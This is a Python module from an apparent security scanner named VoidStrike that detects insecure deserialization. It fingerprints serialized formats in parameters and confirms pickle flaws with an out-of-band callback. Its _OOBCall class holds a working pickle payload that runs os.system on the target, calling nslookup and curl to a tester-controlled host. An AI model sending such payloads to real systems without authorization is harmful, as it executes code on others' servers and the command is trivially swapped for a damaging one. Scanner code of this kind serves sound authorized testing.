"""Insecure deserialization detection.

Fully verifying deserialization RCE usually requires language- and
library-specific gadget chains. VoidStrike takes a safe, high-signal approach:

* **format fingerprinting** — recognise serialized blobs already flowing
  through a parameter (Java ``\\xac\\xed`` / ``rO0``, PHP ``O:``/``a:``,
  Python pickle opcodes, .NET ``AAEAAAD``), which is itself reportable.
* **OOB confirmation** — for Python ``pickle`` it emits a callback-only gadget
  (triggers a DNS/HTTP lookup to tester-controlled infra, nothing else). For
  Java it can shell out to a local ``ysoserial`` (path via ``VOIDSTRIKE_YSOSERIAL``)
  to build a benign ``URLDNS`` gadget. Neither payload runs a destructive command.
"""

from __future__ import annotations

import base64
import os
import pickle
import subprocess

from ..engine.models import Confidence, Severity, Target
from .base import Module

_FINGERPRINTS = {
    "java (raw magic)": b"\xac\xed\x00\x05",
    "java (base64 rO0)": b"rO0AB",
    "php serialized object": b"O:",
    "python pickle": b"\x80",
    ".net BinaryFormatter": b"AAEAAAD",
}


class _OOBCall:
    """Picklable object whose __reduce__ triggers an out-of-band lookup only.

    This is intentionally benign: it runs a single name-resolution/HTTP fetch to
    infrastructure the tester controls, proving the pickle was deserialized
    without executing any attacker-chosen command on the target's behalf.
    """

    def __init__(self, host: str):
        self.host = host

    def __reduce__(self):
        cmd = f"nslookup {self.host} || curl -s http://{self.host}/ || true"
        return (os.system, (cmd,))


class Deserialization(Module):
    name = "deserialization"
    vuln_class = "Insecure Deserialization"
    severity = Severity.CRITICAL
    remediation = (
        "Do not deserialize untrusted data. Prefer data-only formats (JSON) with "
        "strict schemas, enable allow-list based resolvers (e.g. Java "
        "ObjectInputFilter), and keep serialization libraries patched."
    )

    async def run(self, target: Target) -> None:
        for point in target.injection_points():
            self._fingerprint(point)
            await self._confirm_python_pickle(point)

    def _fingerprint(self, point) -> None:
        raw = (point.baseline_value or "").encode(errors="ignore")
        candidates = [raw]
        try:
            candidates.append(base64.b64decode(point.baseline_value or "", validate=False))
        except Exception:  # noqa: BLE001
            pass
        for label, sig in _FINGERPRINTS.items():
            if any(blob.startswith(sig) or sig in blob[:8] for blob in candidates):
                self.log.info(
                    f"[deserialization] {label} blob observed at {point.describe()} "
                    "— endpoint accepts serialized input"
                )

    async def _confirm_python_pickle(self, point) -> bool:
        if not self.s.oob.active:
            return False
        token = self.s.oob.new_token("deser")
        host = self.s.oob.callback_host(token)
        raw = pickle.dumps(_OOBCall(host))
        variants = [
            base64.b64encode(raw).decode(),
            base64.urlsafe_b64encode(raw).decode(),
        ]
        for payload in variants:
            result = await self.s.probe(
                point=point, payload=payload, marker="",
                vuln_class=self.vuln_class, module=self.name,
            )
            if result is None:
                break
            inter = await self.s.oob.wait_for(token, timeout=8.0)
            if inter is not None:
                result.verdict.verdict = "executed"
                result.verdict.confidence = 0.95
                result.verdict.signal = "pickle deserialization OOB callback received"
                result.verdict.evidence = inter.raw or inter.source_ip
                self._record(result, oracle="oob", confidence=Confidence.CONFIRMED)
                return True
        return False

    # -- optional Java URLDNS gadget via local ysoserial -----------------
    def java_urldns(self, host: str) -> str | None:
        """Build a benign Java URLDNS gadget if ysoserial is available locally."""
        jar = os.environ.get("VOIDSTRIKE_YSOSERIAL")
        if not jar or not os.path.exists(jar):
            return None
        try:
            out = subprocess.run(
                ["java", "-jar", jar, "URLDNS", f"http://{host}/"],
                capture_output=True, timeout=30, check=True,
            )
            return base64.b64encode(out.stdout).decode()
        except (subprocess.SubprocessError, OSError):
            return None
